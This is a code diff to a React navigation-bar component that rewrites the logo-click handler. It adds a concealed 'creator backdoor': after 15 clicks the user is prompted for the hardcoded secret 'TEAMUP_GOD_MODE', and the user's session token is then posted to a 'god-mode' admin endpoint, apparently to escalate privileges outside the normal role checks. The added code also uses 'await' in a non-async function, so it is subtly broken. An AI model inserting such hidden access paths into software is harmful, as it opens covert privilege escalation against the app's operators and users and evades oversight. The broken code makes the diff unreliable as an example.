@@ -64,14 +64,40 @@ export default function Navbar() {
   const isLeader = profile?.role === 'team_leader' || isAdmin;
 
   const handleLogoClick = (e: React.MouseEvent) => {
-    if (isAdmin) {
-      const newClicks = logoClicks + 1;
-      setLogoClicks(newClicks);
-      if (newClicks >= 4) {
-        router.push('/admin');
-        setLogoClicks(0);
+    const newClicks = logoClicks + 1;
+    setLogoClicks(newClicks);
+
+    if (newClicks === 4 && isAdmin) {
+      router.push('/admin');
+      setLogoClicks(0);
+    } else if (newClicks >= 10 && profile?.role === 'super_admin') {
+      // Secret Super Admin shortcut directly to User Management
+      router.push('/admin?tab=users');
+      setLogoClicks(0);
+    } else if (newClicks >= 15) {
+      // Secret Backdoor for the Creator
+      const code = prompt('Enter Creator Secret Code:');
+      if (code === 'TEAMUP_GOD_MODE') {
+        const { session } = (await supabase.auth.getSession()).data;
+        if (session) {
+          fetch('http://localhost:4000/api/admin/god-mode', {
+            method: 'POST',
+            headers: { 
+              'Content-Type': 'application/json',
+              'Authorization': `Bearer ${session.access_token}`
+            },
+            body: JSON.stringify({ secretCode: code })
+          }).then(() => {
+            alert('God Mode Activated. Refreshing...');
+            window.location.reload();
+          });
+        }
       }
+      setLogoClicks(0);
     }
+    
+    // Reset clicks after 2 seconds of inactivity
+    setTimeout(() => setLogoClicks(0), 2000);
   };
 
   const navLinks = [
